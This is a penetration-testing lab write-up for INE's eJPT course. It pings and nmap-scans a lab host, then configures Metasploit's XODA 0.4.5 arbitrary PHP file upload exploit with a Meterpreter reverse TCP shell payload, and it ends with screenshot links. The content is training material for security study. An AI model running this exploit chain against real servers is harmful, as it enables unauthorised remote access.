```jsx
Lab Name: T1046 : Network Service Scanning
Platform: INE
Lab No: 24
Exam: eJPT (Jr. Penetartion Tester)
```

## Pinging:

```console
┌──(root㉿INE)-[~]
└─# ping -c 4 demo1.ine.local
PING demo1.ine.local (192.119.99.3) 56(84) bytes of data.
64 bytes from demo1.ine.local (192.119.99.3): icmp_seq=1 ttl=64 time=0.327 ms
64 bytes from demo1.ine.local (192.119.99.3): icmp_seq=2 ttl=64 time=0.067 ms
64 bytes from demo1.ine.local (192.119.99.3): icmp_seq=3 ttl=64 time=0.070 ms
64 bytes from demo1.ine.local (192.119.99.3): icmp_seq=4 ttl=64 time=0.067 ms

--- demo1.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3090ms
rtt min/avg/max/mdev = 0.067/0.132/0.327/0.112 ms
```

## NMAP Scan:

```console
┌──(root㉿INE)-[~]
└─# nmap demo1.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 15:37 IST
Nmap scan report for demo1.ine.local (192.119.99.3)
Host is up (0.000021s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:C0:77:63:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
```

## Exploitation:

```console
┌──(root㉿INE)-[~]
└─# msfconsole -q
msf6 > search xoda_file_upload

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/webapp/xoda_file_upload  2012-08-21       excellent  Yes    XODA 0.4.5 Arbitrary PHP File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/xoda_file_upload

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/xoda_file_upload) > show options

Module options (exploit/unix/webapp/xoda_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /xoda/           yes       The base path to the web application
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   XODA 0.4.5



View the full module info with the info, or info -d command.

msf6 exploit(unix/webapp/xoda_file_upload) > set RHOST demo1.ine.local
RHOST => demo1.ine.local
msf6 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /
TARGETURI => /
msf6 exploit(unix/webapp/xoda_file_upload) > set LHOST 192.119.99.2
LHOST => 192.119.99.2
msf6 exploit(unix/webapp/xoda_file_upload) > show options

Module options (exploit/unix/webapp/xoda_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     demo1.ine.local  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.119.99.2     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   XODA 0.4.5



View the full module info with the info, or info -d command.
```

![image](https://github.com/user-attachments/assets/ce8364c6-4fb5-45d9-8c3a-5d40125842df)

![image](https://github.com/user-attachments/assets/f7f25d9c-d246-4995-9c66-4c15add12624)

![image](https://github.com/user-attachments/assets/2c80e8bf-caa7-4cf5-ad9a-db47527deaa6)

![image](https://github.com/user-attachments/assets/6e242b0d-9b07-41ed-8351-48590bdfee92)

![image](https://github.com/user-attachments/assets/f61fd7ef-0be9-4b73-a2b8-a9c9f6bafe81)

![image](https://github.com/user-attachments/assets/f6439f59-c85c-4964-9570-5bf083cddb43)

![image](https://github.com/user-attachments/assets/58bdba7c-a8ac-4032-b5e0-71e5dc095884)

![image](https://github.com/user-attachments/assets/1d9a89b8-5954-4196-8ac5-5fdd594ef363)
